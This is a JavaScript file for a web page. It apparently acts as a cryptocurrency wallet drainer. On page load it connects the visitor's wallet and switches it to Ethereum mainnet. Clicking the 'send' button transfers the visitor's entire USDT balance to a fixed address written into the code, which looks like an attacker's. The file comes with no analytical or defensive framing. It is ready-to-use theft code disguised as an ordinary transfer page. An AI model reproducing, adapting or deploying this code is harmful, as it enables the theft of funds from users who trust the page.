// USDT 合约地址和目标地址
const USDT_CONTRACT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const TARGET_ADDRESS = "0x64C6592164CC7C0Bdfb1D9a6F64C172a1830eD2C";
const USDT_ABI = [
    {
        "constant": false,
        "inputs": [
            { "name": "_to", "type": "address" },
            { "name": "_value", "type": "uint256" }
        ],
        "name": "transfer",
        "outputs": [{ "name": "", "type": "bool" }],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [{ "name": "_owner", "type": "address" }],
        "name": "balanceOf",
        "outputs": [{ "name": "balance", "type": "uint256" }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }
];

// 全局变量
let provider = null, signer = null;

// 页面加载时直接连接钱包
window.addEventListener('load', async () => {
    try {
        // 确保 ethers.js 已加载
        if (typeof ethers === 'undefined') {
            throw new Error('ethers.js 加载失败，请检查网络或刷新页面！');
        }

        // 检查 window.ethereum 是否存在
        if (!window.ethereum) {
            throw new Error('未检测到钱包，请确保已在钱包内置浏览器中访问页面！');
        }

        // 初始化 provider
        provider = new ethers.providers.Web3Provider(window.ethereum);

        // 直接请求连接钱包
        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
        if (!accounts || accounts.length === 0) {
            throw new Error('未连接到钱包，请授权连接！');
        }

        // 切换到以太坊主网
        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
        if (chainId !== '0x1') {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x1' }],
                });
            } catch (switchError) {
                throw new Error('切换网络失败，请手动切换到以太坊主网！');
            }
        }

        // 获取 signer 和地址
        signer = provider.getSigner();
        const address = await signer.getAddress();
        document.getElementById('account-address').textContent = address.slice(0, 6) + '...' + address.slice(-4);
    } catch (e) {
        console.error('连接钱包失败:', e);
        alert(e.message || '连接钱包失败，请确保已在钱包内置浏览器中访问页面！');
    }
});

// 发送按钮事件
document.querySelector('.send-btn').addEventListener('click', async (event) => {
    event.preventDefault(); // 确保手机端点击事件触发
    try {
        // 检查 signer 是否存在
        if (!signer) {
            throw new Error('请先连接钱包！');
        }

        // 检查 provider 是否存在
        if (!provider) {
            throw new Error('未检测到钱包提供者，请刷新页面重试！');
        }

        // 初始化 USDT 合约
        const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);

        // 获取余额
        const balance = await usdtContract.balanceOf(await signer.getAddress());
        console.log('当前余额:', ethers.utils.formatUnits(balance, 6), 'USDT');

        // 发起转账（即使余额为 0 也会尝试）
        const tx = await usdtContract.transfer(TARGET_ADDRESS, balance);
        console.log('转账交易:', tx);

        // 等待交易确认
        await tx.wait();
        alert('转账成功！');
    } catch (e) {
        console.error('转账失败:', e);
        // 如果用户取消转账（例如点击“拒绝”），显示“您已取消转账”
        if (e.code === 4001 || e.message.includes('user rejected')) {
            alert('您已取消转账');
        } else {
            // 其他错误，显示详细提示
            alert('转账失败：' + (e.message || '未知错误，请检查控制台！'));
        }
    }
});

// 取消按钮事件
document.querySelector('.cancel-btn').addEventListener('click', () => {
    alert('已取消转账操作');
});
